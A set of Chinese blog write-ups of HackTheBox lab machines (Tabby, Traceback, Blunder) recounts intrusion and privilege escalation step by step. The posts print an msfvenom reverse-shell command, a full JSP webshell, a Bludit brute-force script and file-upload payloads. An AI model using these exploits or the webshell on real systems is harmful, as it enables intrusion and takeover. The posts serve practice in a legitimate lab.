可以获取到passwd文件：\nroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\rsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\rsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\rsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\rmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\rsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\r_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\rtss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\ruuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\rtcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\rlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\rpollinate:x:110:1::/var/cache/pollinate:/bin/false\rsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\rsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\rlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\rtomcat:x:997:997::/opt/tomcat:/bin/false\rmysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false\rash:x:1000:1000:clive:/home/ash:/bin/bash\r可以看到这个靶机上面出了root还用tomcat、ash等用户。\n但是这个目录穿越只是任意文件读取，并不是文件包含漏洞：\nroot@wh1sper:~/tools/dirsearch# curl http://10.10.10.194/news.php?file=../../../../var/www/html/news.php\r\u003c?php\r$file = $_GET['file'];\r$fh = fopen(\"files/$file\",\"r\");\rwhile ($line = fgets($fh)) {\recho($line);\r}\rfclose($fh);\r?\u003e\rroot@wh1sper:~/tools/dirsearch#\r我们可以看到他直接输出了PHP的代码，并没有去当作PHP执行，所以是任意文件读取。\n我们回到Tomcat页面，页面最后一行提示了我们 Users are defined in /etc/tomcat9/tomcat-users.xml ，如果我们能读取这个文件的话，我们就可以用里面的用户名密码登录tomcat的管理后台了\n但是页面提示的/etc/tomcat-users.xml并不能读取，后来网上查了下tomcat默认安装路径可能是/usr/share/tomcat9，于是尝试 /usr/share/tomcat9/etc/tomcat-users.xml ，成功读取到了文件：\nroot@wh1sper:~/HTB/machine/Tabby# curl http://10.10.10.194/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml\r\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\r\u003c!--\rLicensed to the Apache Software Foundation (ASF) under one or more\rcontributor license agreements. See the NOTICE file distributed with\rthis work for additional information regarding copyright ownership.\rThe ASF licenses this file to You under the Apache License, Version 2.0\r(the \"License\"); you may not use this file except in compliance with\rthe License. You may obtain a copy of the License at\rhttp://www.apache.org/licenses/LICENSE-2.0\rUnless required by applicable law or agreed to in writing, software\rdistributed under the License is distributed on an \"AS IS\" BASIS,\rWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\rSee the License for the specific language governing permissions and\rlimitations under the License.\r--\u003e\r\u003ctomcat-users xmlns=\"http://tomcat.apache.org/xml\"\rxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\rxsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\"\rversion=\"1.0\"\u003e\r\u003c!--\rNOTE: By default, no user is included in the \"manager-gui\" role required\rto operate the \"/manager/html\" web application. If you wish to use this app,\ryou must define such a user - the username and password are arbitrary. It is\rstrongly recommended that you do NOT use one of the users in the commented out\rsection below since they are intended for use with the examples web\rapplication.\r--\u003e\r\u003c!--\rNOTE: The sample user and role entries below are intended for use with the\rexamples web application. They are wrapped in a comment and thus are ignored\rwhen reading this file. If you wish to configure these users for use with the\rexamples web application, do not forget to remove the \u003c!.. ..\u003e that surrounds\rthem. You will also need to set the passwords to something appropriate.\r--\u003e\r\u003c!--\r\u003crole rolename=\"tomcat\"/\u003e\r\u003crole rolename=\"role1\"/\u003e\r\u003cuser username=\"tomcat\" password=\"\u003cmust-be-changed\u003e\" roles=\"tomcat\"/\u003e\r\u003cuser username=\"both\" password=\"\u003cmust-be-changed\u003e\" roles=\"tomcat,role1\"/\u003e\r\u003cuser username=\"role1\" password=\"\u003cmust-be-changed\u003e\" roles=\"role1\"/\u003e\r--\u003e\r\u003crole rolename=\"admin-gui\"/\u003e\r\u003crole rolename=\"manager-script\"/\u003e\r\u003cuser username=\"tomcat\" password=\"$3cureP4s5w0rd123!\" roles=\"admin-gui,manager-script\"/\u003e\r\u003c/tomcat-users\u003e\rroot@wh1sper:~/HTB/machine/Tabby#\r然后后台地址是： 10.10.10.194:8080/manager/ (这个登录不上)，另一个是 10.10.10.194:8080/host-manager/html 输入用户名tomcat密码$3cureP4s5w0rd123!就可以进去\n我们目的是Getshell，但是这个后台并不能文件上传，但但是tomcat可以独特地通过命令行去部署.war包\nCurl远程部署恶意war包 在tomcat-users.xml中写了tomcat用户没有manager-gui角色，因此无法登录manager/html页面，但是tomcat用户还具有manager-script角色，所以可以执行命令\ntomcat命令行部署war包：https://blog.csdn.net/chumo6161/article/details/100615971\ntomcat manageapp操作方法：http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html\n我们用一个免杀jsp马来制作好war包，然后通过curl远程部署到靶机上面：\n我的免杀base64用不了，换了msf的马：\nroot@wh1sper:~/HTB/machine/Tabby# msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.81 lport=10086 -f war -o Formalhaut.war\r[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\r[-] No arch selected, selecting arch: x86 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 68 bytes\rFinal size of war file: 1538 bytes\rSaved as: Formalhaut.war\rroot@wh1sper:~/HTB/machine/Tabby# ls\rFormalhaut.war JSP.jsp shell.jsp shell.war wh1sper.war\rroot@wh1sper:~/HTB/machine/Tabby# unzip Formalhaut.war Archive: Formalhaut.war\rcreating: META-INF/\rinflating: META-INF/MANIFEST.MF creating: WEB-INF/\rinflating: WEB-INF/web.xml inflating: ubvqchbvesep.jsp root@wh1sper:~/HTB/machine/Tabby#\r监听10086端口，访问jsp文件我们就能收到shell：\n同理可以上传一个jsp菜刀版用蚁剑连接使用图形化文件管理系统：\njsp菜刀版\n\u003c%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%\u003e\r\u003c%!String Pwd = \"pass\";\rString EC(String s, String c) throws Exception {\rreturn s;\r}//new String(s.getBytes(\"ISO-8859-1\"),c);}\rConnection GC(String s) throws Exception {\rString[] x = s.trim().split(\"\\r\\n\");\rClass.forName(x[0].trim()).newInstance();\rConnection c = DriverManager.getConnection(x[1].trim());\rif (x.length \u003e 2) {\rc.setCatalog(x[2].trim());\r}\rreturn c;\r}\rvoid AA(StringBuffer sb) throws Exception {\rFile r[] = File.listRoots();\rfor (int i = 0; i \u003c r.length; i++) {\rsb.append(r[i].toString().substring(0, 2));\r}\r}\rvoid BB(String s, StringBuffer sb) throws Exception {\rFile oF = new File(s), l[] = oF.listFiles();\rString sT, sQ, sF = \"\";\rjava.util.Date dt;\rSimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\rfor (int i = 0; i \u003c l.length; i++) {\rdt = new java.util.Date(l[i].lastModified());\rsT = fm.format(dt);\rsQ = l[i].canRead() ? \"R\" : \"\";\rsQ += l[i].canWrite() ? \" W\" : \"\";\rif (l[i].isDirectory()) {\rsb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()\r+ \"\\t\" + sQ + \"\\n\");\r} else {\rsF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"\r+ sQ + \"\\n\";\r}\r}\rsb.append(sF);\r}\rvoid EE(String s) throws Exception {\rFile f = new File(s);\rif (f.isDirectory()) {\rFile x[] = f.listFiles();\rfor (int k = 0; k \u003c x.length; k++) {\rif (!x[k].delete()) {\rEE(x[k].getPath());\r}\r}\r}\rf.delete();\r}\rvoid FF(String s, HttpServletResponse r) throws Exception {\rint n;\rbyte[] b = new byte[512];\rr.reset();\rServletOutputStream os = r.getOutputStream();\rBufferedInputStream is = new BufferedInputStream(new FileInputStream(s));\ros.write((\"-\u003e\" + \"|\").getBytes(), 0, 3);\rwhile ((n = is.read(b, 0, 512)) != -1) {\ros.write(b, 0, n);\r}\ros.write((\"|\" + \"\u003c-\").getBytes(), 0, 3);\ros.close();\ris.close();\r}\rvoid GG(String s, String d) throws Exception {\rString h = \"0123456789ABCDEF\";\rint n;\rFile f = new File(s);\rf.createNewFile();\rFileOutputStream os = new FileOutputStream(f);\rfor (int i = 0; i \u003c d.length(); i += 2) {\ros\r.write((h.indexOf(d.charAt(i)) \u003c\u003c 4 | h.indexOf(d\r.charAt(i + 1))));\r}\ros.close();\r}\rvoid HH(String s, String d) throws Exception {\rFile sf = new File(s), df = new File(d);\rif (sf.isDirectory()) {\rif (!df.exists()) {\rdf.mkdir();\r}\rFile z[] = sf.listFiles();\rfor (int j = 0; j \u003c z.length; j++) {\rHH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());\r}\r} else {\rFileInputStream is = new FileInputStream(sf);\rFileOutputStream os = new FileOutputStream(df);\rint n;\rbyte[] b = new byte[512];\rwhile ((n = is.read(b, 0, 512)) != -1) {\ros.write(b, 0, n);\r}\ris.close();\ros.close();\r}\r}\rvoid II(String s, String d) throws Exception {\rFile sf = new File(s), df = new File(d);\rsf.renameTo(df);\r}\rvoid JJ(String s) throws Exception {\rFile f = new File(s);\rf.mkdir();\r}\rvoid KK(String s, String t) throws Exception {\rFile f = new File(s);\rSimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\rjava.util.Date dt = fm.parse(t);\rf.setLastModified(dt.getTime());\r}\rvoid LL(String s, String d) throws Exception {\rURL u = new URL(s);\rint n;\rFileOutputStream os = new FileOutputStream(d);\rHttpURLConnection h = (HttpURLConnection) u.openConnection();\rInputStream is = h.getInputStream();\rbyte[] b = new byte[512];\rwhile ((n = is.read(b, 0, 512)) != -1) {\ros.write(b, 0, n);\r}\ros.close();\ris.close();\rh.disconnect();\r}\rvoid MM(InputStream is, StringBuffer sb) throws Exception {\rString l;\rBufferedReader br = new BufferedReader(new InputStreamReader(is));\rwhile ((l = br.readLine()) != null) {\rsb.append(l + \"\\r\\n\");\r}\r} void NN(String s, StringBuffer sb) throws Exception {\rConnection c = GC(s);\rResultSet r = c.getMetaData().getCatalogs();\rwhile (r.next()) {\rsb.append(r.getString(1) + \"\\t\");\r}\rr.close();\rc.close();\r}\rvoid OO(String s, StringBuffer sb) throws Exception {\rConnection c = GC(s);\rString[] t = { \"TABLE\" };\rResultSet r = c.getMetaData().getTables(null, null, \"%\", t);\rwhile (r.next()) {\rsb.append(r.getString(\"TABLE_NAME\") + \"\\t\");\r}\rr.close();\rc.close();\r}\rvoid PP(String s, StringBuffer sb) throws Exception {\rString[] x = s.trim().split(\"\\r\\n\");\rConnection c = GC(s);\rStatement m = c.createStatement(1005, 1007);\rResultSet r = m.executeQuery(\"select * from \" + x[3]);\rResultSetMetaData d = r.getMetaData();\rfor (int i = 1; i \u003c= d.getColumnCount(); i++) {\rsb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)\r+ \")\\t\");\r}\rr.close();\rm.close();\rc.close();\r}\rvoid QQ(String cs, String s, String q, StringBuffer sb) throws Exception {\rint i;\rConnection c = GC(s);\rStatement m = c.createStatement(1005, 1008);\rtry {\rResultSet r = m.executeQuery(q);\rResultSetMetaData d = r.getMetaData();\rint n = d.getColumnCount();\rfor (i = 1; i \u003c= n; i++) {\rsb.append(d.getColumnName(i) + \"\\t|\\t\");\r}\rsb.append(\"\\r\\n\");\rwhile (r.next()) {\rfor (i = 1; i \u003c= n; i++) {\rsb.append(EC(r.getString(i), cs) + \"\\t|\\t\");\r}\rsb.append(\"\\r\\n\");\r}\rr.close();\r} catch (Exception e) {\rsb.append(\"Result\\t|\\t\\r\\n\");\rtry {\rm.executeUpdate(q);\rsb.append(\"Execute Successfully!\\t|\\t\\r\\n\");\r} catch (Exception ee) {\rsb.append(ee.toString() + \"\\t|\\t\\r\\n\");\r}\r}\rm.close();\rc.close();\r}%\u003e\r\u003c%\rString cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";\rrequest.setCharacterEncoding(cs);\rresponse.setContentType(\"text/html;charset=\" + cs);\rString Z = EC(request.getParameter(Pwd) + \"\", cs);\rString z1 = EC(request.getParameter(\"z1\") + \"\", cs);\rString z2 = EC(request.getParameter(\"z2\") + \"\", cs);\rStringBuffer sb = new StringBuffer(\"\");\rtry {\rsb.append(\"-\u003e\" + \"|\");\rif (Z.equals(\"A\")) {\rString s = new File(application.getRealPath(request\r.getRequestURI())).getParent();\rsb.append(s + \"\\t\");\rif (!s.substring(0, 1).equals(\"/\")) {\rAA(sb);\r}\r} else if (Z.equals(\"B\")) {\rBB(z1, sb);\r} else if (Z.equals(\"C\")) {\rString l = \"\";\rBufferedReader br = new BufferedReader(\rnew InputStreamReader(new FileInputStream(new File(\rz1))));\rwhile ((l = br.readLine()) != null) {\rsb.append(l + \"\\r\\n\");\r}\rbr.close();\r} else if (Z.equals(\"D\")) {\rBufferedWriter bw = new BufferedWriter(\rnew OutputStreamWriter(new FileOutputStream(\rnew File(z1))));\rbw.write(z2);\rbw.close();\rsb.append(\"1\");\r} else if (Z.equals(\"E\")) {\rEE(z1);\rsb.append(\"1\");\r} else if (Z.equals(\"F\")) {\rFF(z1, response);\r} else if (Z.equals(\"G\")) {\rGG(z1, z2);\rsb.append(\"1\");\r} else if (Z.equals(\"H\")) {\rHH(z1, z2);\rsb.append(\"1\");\r} else if (Z.equals(\"I\")) {\rII(z1, z2);\rsb.append(\"1\");\r} else if (Z.equals(\"J\")) {\rJJ(z1);\rsb.append(\"1\");\r} else if (Z.equals(\"K\")) {\rKK(z1, z2);\rsb.append(\"1\");\r} else if (Z.equals(\"L\")) {\rLL(z1, z2);\rsb.append(\"1\");\r} else if (Z.equals(\"M\")) {\rString[] c = { z1.substring(2), z1.substring(0, 2), z2 };\rProcess p = Runtime.getRuntime().exec(c);\rMM(p.getInputStream(), sb);\rMM(p.getErrorStream(), sb);\r} else if (Z.equals(\"N\")) {\rNN(z1, sb);\r} else if (Z.equals(\"O\")) {\rOO(z1, sb);\r} else if (Z.equals(\"P\")) {\rPP(z1, sb);\r} else if (Z.equals(\"Q\")) {\rQQ(cs, z1, z2, sb);\r}\r} catch (Exception e) {\rsb.append(\"ERROR\" + \":// \" + e.toString());\r}\rsb.append(\"|\" + \"\u003c-\");\rout.print(sb.toString());\r%\u003e\r提权 爆破web路径压缩包密码 翻看他的web路径/var/www/html，在file文件夹下有一个加密的压缩包\n蚁剑下载下来本地破解下密码；\n。。。尝试了很多方法，跑了很久跑不出来，，最后还是去翻了wp，使用kali自带的/usr/share/wordlists/rockyou.txt.gz字典进行破解：\n解压字典：\nroot@wh1sper:/usr/share/wordlists# ls\rdirb dirbuster fasttrack.txt fern-wifi metasploit nmap.lst rockyou.txt.gz wfuzz\rroot@wh1sper:/usr/share/wordlists# gzip -d rockyou.txt.gz root@wh1sper:/usr/share/wordlists# ls\rdirb dirbuster fasttrack.txt fern-wifi metasploit nmap.lst rockyou.txt wfuzz\r开始爆破：\nroot@wh1sper:~/HTB/machine/Tabby# john zippass.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (PKZIP [32/64])\rWill run 4 OpenMP threads\rPress 'q' or Ctrl-C to abort, almost any other key for status\radmin@it (1.zip)\r1g 0:00:00:00 DONE (2020-07-21 07:47) 1.562g/s 16192Kp/s 16192Kc/s 16192KC/s adnc153..adenabuck\rUse the \"--show\" option to display all of the cracked passwords reliably\rSession completed\rroot@wh1sper:~/HTB/machine/Tabby#\r，，，秒出，使用密码 admin@it 解压。\n提权ash用户 不过解压出来之后我们并不能发现压缩包里面有什么特别的，之前读取/etc/passwd的时候我们看到了有个ash用户，于是尝试用这个密码来登录ash用户：\nsu ash\rPassword: admin@it\rid\ruid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)\r果然可以成功！/home/user.txt就可以拿到手了\n","description":"","tags":["HackTheBox","Tomcat","提权"],"title":"HackTheBox::Tabby","uri":"/posts/hacktheboxtabby/"},{"categories":["渗透"],"content":"打开是一个黑页\n看源码有一句hint：\n\u003c!--Some of the best web shells that you might need ;)--\u003e\r利用已有的webshell获得webadmin权限 扫目录，无果，尝试直接Google这句话，果然找到了作者的Github，在作者列出的一堆shell里面一个个尝试，最后找到了smevk.php，用户密码admin就进去了，然后直接上传文件getshell。\n在/home目录下发现两个文件夹，其中sysadmin没有权限访问，webadmin里面有个note.txt：\n- sysadmin -\rI have left a tool to practice Lua.\rI'm sure you know where to find it.\rContact me if you have any question.\r然后我们可以查看webadmin的.bash_history：\n.bash_history\n好吧其实这才是原版：\nls -la\rsudo -l\rnano privesc.lua\rsudo -u sysadmin /home/sysadmin/luvit privesc.lua rm privesc.lua\rlogout\r大概就是通过 /home/sysadmin/luvit 这个东西来执行lua脚本，找了半天并没有找到privesc.lua，我们可以新建一个来执行，由于lua可以用sysadmin权限执行，我们得以读取/home/sysadmin/user.txt；\n查看webadmin的权限：\n(webadmin:/var/www/html) $ sudo -l\rMatching Defaults entries for webadmin on traceback:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser webadmin may run the following commands on traceback:\r(sysadmin) NOPASSWD: /home/sysadmin/luvit\r(webadmin:/var/www/html) $\rprivesc.lua：\nos.execute(\"ls /home/sysadmin/\")\ros.execute(\"cat /home/sysadmin/user.txt\")\r两次分别用蚁剑终端执行：\n(webadmin:/home/webadmin) $ sudo -u sysadmin /home/sysadmin/luvit privesc.lua\rluvit\ruser.txt\r(webadmin:/home/webadmin) $ sudo -u sysadmin /home/sysadmin/luvit privesc.lua\rfaca73f508ba5f752100d6de13500714\r(webadmin:/home/webadmin) $\r写公钥获得sysadmin的SSH 运行命令生成RAS公私钥对：\nssh-keygen -t rsa\r保存到当前目录，我们可以看到生成了两个文件：\nroot@wh1sper:~/HTB/machine/Traceback# ls -a\r. .. id_rsa id_rsa.pub pspy64 pspy64s unix-privesc-check unix-privesc-check.tar\rroot@wh1sper:~/HTB/machine/Traceback#\r其中 id_rsa.pub 是公钥，我们利用webshell把他上传到 /home/username/.ssh/authorized_keys 这个文件里面就可以获得这个user的权限。\n既然lua脚本可以读写sysadmin的目录，我们便利用他写sysadmin的公钥：\n随后执行命令，用私钥登录SSH：\nssh -i id_rsa sysadmin@10.10.10.181\r可以看到我们是sysadmin了。\n利用pspy工具在没有root的情况下监视高权限进程 pspy工具地址：\nhttps://github.com/DominicBreuker/pspy\nhttps://github.com/Tib3rius/pspy\n利用webshell上传到服务器，在当前目录执行：\n./pspy64 可以看到\n标机器每30秒会执行一个cp命令，把一些文件从backup目录复制到/etc/update-motd.d/\n/bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\r我们去查看这个目录下有什么东西：\n$ cd /etc/update-motd.d/\r$ pwd\r/etc/update-motd.d\r$ ls\r00-header 10-help-text 50-motd-news 80-esm 91-release-upgrade\r$ cat 00-header\r#!/bin/sh\r#\r# 00-header - create the header of the MOTD\r# Copyright (C) 2009-2010 Canonical Ltd.\r#\r# Authors: Dustin Kirkland \u003ckirkland@canonical.com\u003e\r#\r# This program is free software; you can redistribute it and/or modify\r# it under the terms of the GNU General Public License as published by\r# the Free Software Foundation; either version 2 of the License, or\r# (at your option) any later version.\r#\r# This program is distributed in the hope that it will be useful,\r# but WITHOUT ANY WARRANTY; without even the implied warranty of\r# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\r# GNU General Public License for more details.\r#\r# You should have received a copy of the GNU General Public License along\r# with this program; if not, write to the Free Software Foundation, Inc.,\r# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\r[ -r /etc/lsb-release ] \u0026\u0026 . /etc/lsb-release\recho \"\\nWelcome to Xh4H land \\n\"\r$ 是不是很熟悉呢？在刚刚登录的时候也是见到了这句话： Welcome to Xh4H land\n随后我们监视到，每次登录SSH都会执行以下命令：\n其中能找到这样一条：\nCMD: UID=0 PID=2007 | /bin/sh /etc/update-motd.d/00-header\r利用root权限运行的脚本弹shell 目的很明确了，这个00-header脚本是用root执行的，我们测试一下：\n$ echo 'id' \u003e\u003e 00-header\r$ exit\rroot@wh1sper:~/HTB/machine/Traceback# ssh -i id_rsa sysadmin@10.10.10.181\r#################################\r-------- OWNED BY XH4H ---------\r- I guess stuff could have been configured better ^^ -\r#################################\rWelcome to Xh4H land uid=0(root) gid=0(root) groups=0(root)\rFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\rLast login: Sat Jul 18 02:23:33 2020 from 10.10.14.98\r$\rid被执行了。不过这个00-header文件好像一直在被还原，手速要快。\n弹之：\nmd蜜汁环境弹不过来\n反正我们知道/root/root.txt，直接echo 'cat /root/root.txt' \u003e\u003e 00-header\n然后登录就能看到了：\necho 'cat /root/root.txt' \u003e\u003e 00-headerroot@wh1sper:~/HTB/machine/Traceback# ssh -i id_rsa sysadmin@10.10.10.181\r#################################\r-------- OWNED BY XH4H ---------\r- I guess stuff could have been configured better ^^ -\r#################################\rWelcome to Xh4H land 96c02bb36b51b8f45d59482a4b0c1aba\rFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\rLast login: Sat Jul 18 02:31:58 2020 from 10.10.14.98\r$\r环境一直有人搅屎。。。建议在美国晚上的时候打\n","description":"","tags":["提权"],"title":"HackTheBox::Traceback","uri":"/posts/hacktheboxtraceback/"},{"categories":["渗透"],"content":"玩一手HTB\n 打开靶机就一些无关紧要的文字，dirsearch扫一下目录可以扫到登录后台，我们可以发现靶机使用了 Bludit cms\n在看了一些Bludit的漏洞之后，发现在没有登录、我们又只有一个后台地址的情况下，弱口令比较靠谱\nCVE-2019-17240 Bludit是一套开源的轻量级博客内容管理系统（CMS）。\nBludit 3.9.2版本中的 bl-kernel/security.class.php 一些代码将检查主机进行的错误登录尝试次数。如果主机进行10次不正确的尝试，则会暂时阻止它们，以减轻暴力破解的企图。攻击者通过使用多个伪造的X-Forwarded-For或Client-IP HTTP标头利用该漏洞绕过保护机制。\n爆破了半天，无果。\n看了wp之后，我们找到了本来没有被dirsearch扫到的/todo.txt：\n-Update the CMS\r-Turn off FTP - DONE\r-Remove old users - DONE\r-Inform fergus that the new blog needs images - PENDING\r可以猜到用户名可能是 fergus ，但是密码需要用到cewl来生成弱口令字典\ncewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/\r然后我们利用改装过后的CVE-2019-17240的poc来打：\n#!/usr/bin/env python3\rimport re\rimport requests\rdef open_ressources(file_path):\rreturn [item.replace(\"\\n\", \"\") for item in open(file_path).readlines()]\rhost = 'http://10.10.10.191'\rlogin_url = host + '/admin/login'\rusername = 'fergus'\rwordlist = open_ressources('wordlist.txt')\rfor password in wordlist:\rsession = requests.Session()\rlogin_page = session.get(login_url)\rcsrf_token = re.search('input.+?name=\"tokenCSRF\".+?value=\"(.+?)\"', login_page.text).group(1)\rprint('[*] Trying: {p}'.format(p = password))\rheaders = {\r'X-Forwarded-For': password,\r'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',\r'Referer': login_url\r}\rdata = {\r'tokenCSRF': csrf_token,\r'username': username,\r'password': password,\r'save': ''\r}\rlogin_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)\rif 'location' in login_result.headers:\rif '/admin/dashboard' in login_result.headers['location']:\rprint()\rprint('SUCCESS: Password found!')\rprint('Use {u}:{p} to login.'.format(u = username, p = password))\rprint()\rbreak\r最后在第一百多位爆破出用户名fergus密码RolandDeschain\n进入后台。\nCVE-2019-16113 文章说的很详细，通过更改uuid的值来指定上传文件的位置，也就是目录穿越\n然后不符合图片后缀的文件会先被移动到/bl-content/tmp/temp/目录下，然后进行删除，我们利用intruder进行条件竞争\n上传.htaccess文件，把jpg解析为php：\nPOST /admin/ajax/upload-images HTTP/1.1\rHost: 10.10.10.191\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\rAccept: */*\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rReferer: http://10.10.10.§191§/admin/edit-content/blender\rX-Requested-With: XMLHttpRequest\rContent-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486\rContent-Length: 560\rConnection: close\rCookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\"images[]\"; filename=\".htaccess\"\rContent-Type: image/jpeg\rRewriteEngine off\rAddType application/x-httpd-php jpg\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\"uuid\"\r21b8a0e80e433cb7453e7d72382c6bc1\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\"tokenCSRF\"\rc623c868d292dec9b4e11c104f54c9e3dde971ee\r-----------------------------1197595220477940257964308486--\r上传恶意wh1sper.jpg到/bl-content/tmp/temp/目录：\nPOST /admin/ajax/upload-images HTTP/1.1\rHost: 10.10.10.191\rUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\rAccept: */*\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rReferer: http://10.10.10.§191§/admin/edit-content/blender\rX-Requested-With: XMLHttpRequest\rContent-Type: multipart/form-data; boundary=---------------------------1197595220477940257964308486\rContent-Length: 589\rConnection: close\rCookie: BLUDIT-KEY=k35lg8hngofh6kvif51i37m0o5\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\"images[]\"; filename=\"wh1sper.jpg\"\rContent-Type: image/jpeg\r\u003c?php file_put_contetns(\"../wh1sper.php\",\"\u003c?php phpinfo();?\u003e\");?\u003e\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\"uuid\"\r21b8a0e80e433cb7453e7d72382c6bc1/../../../tmp/temp\r-----------------------------1197595220477940257964308486\rContent-Disposition: form-data; name=\"tokenCSRF\"\rc623c868d292dec9b4e11c104f54c9e3dde971ee\r-----------------------------1197595220477940257964308486--\r获得shell：\n拿到了shell之后根目录并没有我们想要的东西，我们这个账户并没有权限查看/root目录；\n我们可以在www目录下看到另外一个版本的bludit，并且再user.php里面可以找到另外一个账户的账号密码\n利用kali自带的 hash-identifier 进行识别：\nroot@wh1sper:~# hash-identifier\r#########################################################################\r# __ __ __ ______ _____ #\r# /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ #\r# \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ #\r# \\ \\ _ \\ /'__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ #\r# \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ #\r# \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ #\r# \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 #\r# By Zion3R #\r# www.Blackploit.com #\r# Root@Blackploit.com #\r#########################################################################\r--------------------------------------------------\rHASH: faca404fd5c0a31cf1897b823c695c85cffeb98d\rPossible Hashs:\r[+] SHA-1\r[+] MySQL5 - SHA-1(SHA-1($pass))\rhttps://md5decrypt.net/en/Sha1/解码得到:Password120\n冰蝎终端：\nsu hugo\rPassword120\r我们切换到了hugo用户，但是还是没有root权限\nhugo@blunder:/var/www/bludit-3.9.2$ sudo -l\rPassword: Password120\rMatching Defaults entries for hugo on blunder:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser hugo may run the following commands on blunder:\r(ALL, !root) /bin/bash\rCVE-2019-14287 Google (ALL, !root) /bin/bash 